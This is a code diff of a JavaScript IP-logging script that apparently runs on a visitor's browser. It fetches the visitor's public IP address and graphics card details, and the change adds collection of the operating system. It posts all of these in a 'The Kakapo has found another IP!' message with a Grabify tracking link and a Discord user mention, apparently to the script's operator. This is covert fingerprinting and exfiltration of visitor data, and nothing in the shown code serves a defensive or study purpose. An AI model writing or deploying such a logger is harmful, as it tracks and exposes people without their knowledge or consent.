@@ -28,6 +28,15 @@ function getVideoCardInfo() {
   };
 }
 
+
+
+function getOS(){
+    console.log(navigator.platform);
+    return navigator.platform;
+}
+
+
+
 function getPublicIPAddress() {
   return fetch('https://api.ipify.org?format=json')
     .then(response => response.json())
@@ -42,8 +51,9 @@ async function logIP() {
   try {
     const ip = await getPublicIPAddress();
     const graphCard = getVideoCardInfo().renderer;
+    const userOS = getOS(); // Moved this line inside the logIP function.
 
-    const message = `The Kakapo has found another IP!\n\nCheck here to see all IPs logged: https://grabify.link/track/QRUKDR\n<@267417391053537280>\n Graphics Card: ${graphCard}\n IP: ${ip}`;
+    const message = `The Kakapo has found another IP!\n\nCheck here to see all IPs logged: https://grabify.link/track/QRUKDR\n<@267417391053537280>\n Graphics Card: ${graphCard}\n IP: ${ip}\n OS: ${userOS}`;
 
     const msg = {
       content: message
